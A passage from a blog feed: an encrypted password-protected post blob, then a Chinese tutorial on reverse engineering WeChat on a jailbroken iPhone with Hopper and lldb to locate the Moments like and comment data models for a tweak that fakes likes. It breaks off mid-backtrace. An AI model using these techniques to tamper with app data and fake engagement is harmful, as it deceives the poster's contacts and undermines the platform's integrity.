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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="Accessibility" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Accessibility/"/>
    
  </entry>
  
  <entry>
    <title>微信集赞/评论插件分析及开发</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/</id>
    <published>2019-07-22T02:22:01.000Z</published>
    <updated>2019-07-28T13:58:12.611Z</updated>
    
    <content type="html"><![CDATA[<h3 id="微信集赞-评论插件分析及开发"><a href="#微信集赞-评论插件分析及开发" class="headerlink" title="微信集赞/评论插件分析及开发"></a>微信集赞/评论插件分析及开发</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>为什么要做这个集赞的插件呢？起因是上周去参加了某个会议，有一个集赞60领玩偶的活动，但是想到平时一条朋友圈也就几个赞，而且又不想找人点赞，领不到，很气。回去以后想着能不能写一个集赞的插件，在需要的时候直接输入想要的赞、评论数量，我发的朋友圈就能有多少赞。这样再有这样的活动岂不美哉。准备开干！</p><h4 id="理性分析"><a href="#理性分析" class="headerlink" title="理性分析"></a>理性分析</h4><p>再开始之前，先理性分析一波：如果想要集赞，这里有两种思路，一个是直接在view层去更改，但是这样得去处理界面的一些细节，一旦不注意，很容易崩溃。还有种思路是更改datasource或者说赞评论的模型。可以想到，最初一条朋友圈肯定是从服务器拿到数据并封装成对应的模型。一般来说，越改底层的数据或者说源头的数据，那么稳定性和真实性就更高。这里我的想法就是既不改view层，也不改源头层，就改封装好的模型那一层应该就很符合要求。接下来主要讲一下怎么我去实现这个需求的分析过程，因为本身功能不是很复杂，大佬随便看看就行。</p><h4 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h4><ul><li>一台mac</li><li>一台越狱的iOS设备</li><li>ida/Hooper/theos</li><li>flex/issh/xia0LLDB</li><li>其他常见逆向工具等</li></ul><p>对于一贯喜欢上调试器分析得我，所以写了<a href="https://github.com/4ch12dy/issh">iSSH</a>和<a href="https://github.com/4ch12dy/xia0LLDB">xia0LLDB</a>两个工具，在这两个工具的辅助下整个插件用了2小时就完成了逆向分析和代码实现。</p><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><h5 id="逆向赞和评论的数据模型"><a href="#逆向赞和评论的数据模型" class="headerlink" title="逆向赞和评论的数据模型"></a>逆向赞和评论的数据模型</h5><p>一切从界面入手，这里分析界面我一般喜欢用flex，在微信的朋友圈界面，用flex很容易发现当前界面的控制器为<code>WCTimeLineViewController</code>而且界面是一个<code>UITableView</code></p><p>将wechat执行文件拖入Hooper（<del>wechat文件太大，ida分析会很卡</del>）找到UITableView的代理方法：<br><code>-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]</code></p><p>这里面肯定会根据模型去设置cell数据</p><pre><code class="objective-c">  r2 = [r28 section];  var_70 = r25;  r24 = [r25 calcDataItemIndex:r2];  r25 = [[MMServiceCenter defaultCenter] retain];  r2 = [WCFacade class];  var_78 = r28;  r0 = [r25 getService:r2];  r0 = [r0 retain];  r24 = [[r0 getTimelineDataItemOfIndex:r24] retain];  [r0 release];  [r25 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r25 = [[r0 getLayerIdForDataItem:r24] retain];  [r0 release];  [r19 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r20 = r0;  r0 = [r0 getShowTip:r24 layerId:r25];  r29 = r29;  r26 = [r0 retain];  [r20 release];  [r19 release];</code></pre><p>整理下来就是</p><p><code>[[MMServiceCenter defaultCenter] getService:[WCFacade class]]</code>会得到一个<code>WCFacade</code>对象，然后通过</p><p><code>[WCFacade getTimelineDataItemOfIndex:]</code>就能得到cell的数据</p><p>看到这里，上调试器！看下都是什么数据…</p><p>将设备用数据线连接上电脑（这里我推荐用数据线的方式，wifi延时太高，影响心情），手机上打开微信</p><p>直接输入<code>issh debug -a wechat</code>就能挂上微信</p><pre><code class="shell">xia0 ~ $ issh debug -a wechat[I]:iproxy process for 2222 port alive, pid=1382[I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++[I]:iOSRE dir exist[I]:iproxy process for 1234 port alive, pid=1395[I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null)[I]:/iOSRE/tools/debugserver file exist, Start debug...[I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -a wechat</code></pre><p>打开另一个终端进行调试（我的lldb已经安装了xia0LLDB脚本）</p><pre><code>xia0 ~ $ lldb&quot;xutil&quot; command installed -&gt; xutil&quot;choose&quot; command installed -&gt; choose&quot;xbr&quot; command installed --&gt; xbr -[UIView initWithFrame:]&quot;sbt&quot; command installed -&gt; sbt// 连接到远端(lldb) pcc</code></pre><p>这里有两种方法：</p><p>一种是用<code>xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;</code>下断点去查看；</p><pre><code>// 对-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]方法下断点(lldb) xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;(lldb) c</code></pre><p>第二种是由于lldb支持choose命令，可以直接拿到<code>WCFacade</code>对象。既然如此选choose</p><pre><code>(lldb) choose WCFacade&lt;__NSArrayM 0x2823d9860&gt;(&lt;WCFacade: 0x139e1c030&gt;)</code></pre><p>调用其<code>getTimelineDataItemOfIndex:</code>方法就能拿到第一条朋友圈的数据</p><pre><code>(lldb) po [0x139e1c030 getTimelineDataItemOfIndex:0]Class name: WCDataItem, addr: 0x13e2871d0tid: 13121667995275047007username: wxid_6913ohfkk7kq12createtime: 1564224719commentUsers: ()contentObj: &lt;WCContentItem: 0x2801f5500&gt;</code></pre><p>输入<code>ivars 0x13e2871d0</code>就能拿到对象的所有属性值</p><pre><code>(lldb) ivars 0x13e2871d0&lt;WCDataItem: 0x13e2871d0&gt;:in WCDataItem:    cid (int): 0    tid (NSString*): @&quot;13121667995275047007&quot;    type (int): 0    flag (int): 0    username (NSString*): @&quot;wxid_6913ohfkk7kq12&quot;    nickname (NSString*): @&quot;xia0&quot;    createtime (int): 1564224719    locationInfo (WCLocationInfo*): &lt;WCLocationInfo: 0x2801f7800&gt;    likeFlag (BOOL): NO    likeCount (int): 0    likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x286152d90&gt;    commentCount (int): 0    commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x2861539c0&gt;    contentObj (WCContentItem*): &lt;WCContentItem: 0x2801f5500&gt;    appInfo (WCAppInfo*): &lt;WCAppInfo: 0x287404080&gt;    contentDesc (NSString*): @&quot;test&quot;</code></pre><p>由于属性太多，这里我就只显示了一些比较关心的数据，可以看到这就是我发的一条内容为test的朋友圈。</p><p>里面我们还发现了<code>likeUsers</code>和<code>commentUsers</code>的字段，冷静思考就知道应该就是对应的赞和评论列表。我先给自己点个赞看下里面的数据。</p><pre><code>likeCount (int): 1likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e37060&gt;</code></pre><p>发现赞的数量变为1了，在看下里面的内容</p><pre><code>(lldb) po 0x283e37060&lt;__NSArrayM 0x283e37060&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content:source: 0type: 1createTime: 1564225007isLocalAdded: 0commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName:bDeleted: 0)</code></pre><p>正是我自己的微信号。同理可以得到评论</p><pre><code>commentCount (int): 1commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e349c0&gt;(lldb) po 0x283e349c0&lt;__NSArrayM 0x283e349c0&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content: 评论测试source: 0type: 2createTime: 1564225144isLocalAdded: 1commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName: (null)bDeleted: 0)</code></pre><p>到这里我们还可以发现赞和评论都是一个类（模型），只是里面的类型字段不同。现在我们其实已经拿到了我们想要的数据模型了。但是还有一个问题在于我们应该什么时候去更改这些数据呢？也就是我们说的hook点。</p><p>最好的hook可以想到是每次刷新数据的时候，这样我们的数据就是最新的。</p><h5 id="寻找HOOK点"><a href="#寻找HOOK点" class="headerlink" title="寻找HOOK点"></a>寻找HOOK点</h5><p>先想一下，刷新数据的时候，当拿到新的数据肯定会封装为一个<code>WCDataItem</code>对象，那么我们可以对<code>WCDataItem</code>里面的方法下断点，然后打印调用链不就反向得到了刷新的函数了吗？</p><p>但是逆向和调试过微信的人都知道，当你使用bt命令的时候只能得到一堆无符号的调用栈像下面这样</p><pre><code>(lldb) bt* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 4.1  * frame #0: 0x000000010857d4d0 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 30312888    frame #1: 0x0000000194fcc638 Foundation`_decodeObjectBinary + 2004    frame #2: 0x0000000194fcbb6c Foundation`_decodeObject + 340    frame #3: 0x0000000194ed24fc Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228    frame #4: 0x0000000194f2a09c 